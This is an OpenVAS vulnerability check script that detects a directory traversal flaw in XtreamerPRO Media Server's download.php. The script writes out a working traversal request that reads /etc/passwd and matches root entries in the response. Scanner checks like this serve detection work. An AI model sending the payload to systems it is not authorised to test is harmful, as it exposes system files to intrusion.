###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_xtreamerpro_media_server_dir_trav_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# XtreamerPRO Media Server 'dir' Parameter Multiple Directory Traversal Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to perform directory traversal
  attacks and read arbitrary files on the affected application.
  Impact Level: Application";
tag_affected = "XtreamerPRO Version 2.6.0, 2.7.0, Other versions may also be affected.";
tag_insight = "The flaws are due to input validation error in 'dir' parameter to
  'download.php' and 'otherlist.php', which allows attackers to read arbitrary
   files via a /%2f.. sequences.";
tag_solution = "No solution or patch is available as of 20th May, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.xtreamer.net/";
tag_summary = "The host is running XtreamerPRO Media Server and is prone to
  multiple directory traversal vulnerabilities.";

if(description)
{
  script_id(900286);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("XtreamerPRO Media Server 'dir' Parameter Multiple Directory Traversal Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17290/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101476");

  script_description(desc);
  script_summary("Check for directory traversal vulnerability in XtreamerPRO Media Server");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 SecPod");
  script_family("Web Servers");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Send and Receive the response
req = http_get(item:"/login_form.php", port:port);
res = http_send_recv(port:port, data:req);

if(res =~ ">Copyright .*[0-9]{4} Xtreamer.net")
{
  ## Construct Directory Traversal Attack Path
  path = "/download.php?dir=/%2f../%2f../etc/&file=passwd";

  ## Construct Directory Traversal Attack Request
  req = http_get(item:path, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Check for patterns present in /etc/passwd file in the response
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:res)){
    security_warning(port);
  }
}
